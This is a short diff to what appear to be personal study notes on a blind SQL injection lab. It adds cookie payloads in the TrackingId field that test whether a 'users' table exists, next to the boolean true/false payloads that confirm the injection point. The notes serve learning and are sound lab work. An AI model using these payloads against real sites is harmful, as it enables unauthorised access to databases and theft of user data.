@@ -30,3 +30,5 @@ CONCAT ( string_value1, string_value2 [, string_valueN ] )
 So, when we inject anything into the get request URL nothing comes back but the welcome back. The clue here was the welcome back and the trackin id was the injection vector. 
 Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='2; session=aaaaaaaaaaaaaaaaaaaaaaaaa     This gave us no welcome back
 Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='1; session=aaaaaaaaaaaaaaaaaaaaaaaaa     This provided welcome back we have are injection vector. 
+Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   Provides welcome back, verifies table
+Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM notusers LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Provides no welcome back, nerifies no table
